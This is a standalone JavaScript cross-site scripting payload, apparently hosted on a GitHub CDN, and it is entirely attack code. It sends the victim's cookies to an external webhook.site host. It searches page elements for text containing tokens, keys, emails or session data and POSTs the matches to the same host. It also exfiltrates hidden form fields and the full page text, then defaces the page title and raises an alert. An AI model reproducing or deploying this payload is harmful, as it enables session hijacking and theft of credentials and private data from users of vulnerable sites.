console.log("🚀 XSS Payload Injected");

// Send all cookies
new Image().src = "https://bab6baf9-25da-4e4a-8c5c-6bbb9c589995.webhook.site/cookie?c=" + encodeURIComponent(document.cookie);

// Change page title and mark DOM
document.title = "☠️ SYSTEM COMPROMISED - XSS Executed";
document.body.setAttribute("data-pwned", "true");

// Extract potential sensitive text from visible elements
let potentialData = [];
document.querySelectorAll("*").forEach(el => {
  let text = el.innerText || el.value || "";
  if (text.match(/@|token|key|user|email|api|session|auth/i)) {
    potentialData.push(`${el.tagName}: ${text}`);
  }
});
if (potentialData.length) {
  fetch("https://bab6baf9-25da-4e4a-8c5c-6bbb9c589995.webhook.site/data-sniff", {
    method: "POST",
    body: potentialData.join("\n")
  });
}

// Extract hidden input fields
document.querySelectorAll('input[type="hidden"]').forEach(input => {
  fetch("https://bab6baf9-25da-4e4a-8c5c-6bbb9c589995.webhook.site/hidden-fields", {
    method: "POST",
    body: `${input.name}=${input.value}`
  });
});

// Send page text content (DOM summary)
fetch("https://bab6baf9-25da-4e4a-8c5c-6bbb9c589995.webhook.site/domtext", {
  method: "POST",
  body: document.body.innerText
});

// Alert for visual proof
alert("🔥 Executed XSS from GitHub CDN!");
console.log("✅ Execution complete");
